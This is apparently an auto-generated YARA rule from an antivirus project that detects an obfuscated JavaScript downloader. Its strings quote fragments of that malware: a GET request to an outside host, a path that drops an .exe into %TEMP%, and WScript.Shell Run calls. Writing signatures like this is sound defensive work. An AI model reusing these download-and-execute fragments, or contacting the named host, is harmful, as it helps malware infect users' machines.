rule sig_20160328_d02a5a936941b6bf5131bfb09aefb3f6 {
  meta:
    description = "datamaliciousorder - file 20160328_d02a5a936941b6bf5131bfb09aefb3f6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f7a651985d3882fd3bef7cfb525f6dd08015640c769df479b60a0f967e4883a6"

  strings:
    $s1  = "function Jhkxse() {return Ojhnaiosc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"tyAxZ8gELTyN.exe\";};" fullword ascii
    $s2  = "Mlcgqr[Luzffavig](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Ciozr](Krslusmumt() * 11)} while (Mlcgqr[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Bjptfmizcw(Dvpkpl, Epxuft){return Dvpkpl - Epxuft;};" fullword ascii
    $s5  = "var Ojhnaiosc = function Tyjeerofto() {return WScript[Fmfifke](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Euzxn(Jvubuji){Ojhnaiosc[\"Run\"](Jvubuji, Rnsyf, Rnsyf);};" fullword ascii
    $s7  = "function Tydnhqo() {return ((Riakk == true) && (Riakk == Vvaohc)) ? 1 : Rnsyf;};" fullword ascii
    $s8  = "function Jgbwiukru()" fullword ascii
    $s9  = "function Krslusmumt(){return 22;};" fullword ascii
    $s10 = "Vvaohc = true; " fullword ascii
    $s11 = "var Rbbdh = false;" fullword ascii
    $s12 = "Riakk = true; " fullword ascii
    $s13 = "var Riakk = false;" fullword ascii
    $s14 = " while (Nulihk){" fullword ascii
    $s15 = "function Arogpam(){return Kpcjwujcur;};" fullword ascii
    $s16 = "function Ytmrlqxfoj(Llelmvc) {var Upobnekoxp = (1, 2, 3, 4, 5, Llelmvc); return Upobnekoxp;};" fullword ascii
    $s17 = "return Bjptfmizcw(Wijgx, Ruovr);" fullword ascii
    $s18 = "var Cecls = new this[\"Date\"]();" fullword ascii
    $s19 = "var Vvaohc = false;" fullword ascii
    $s20 = "function Rhdtfnn(){return Fmfifke;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}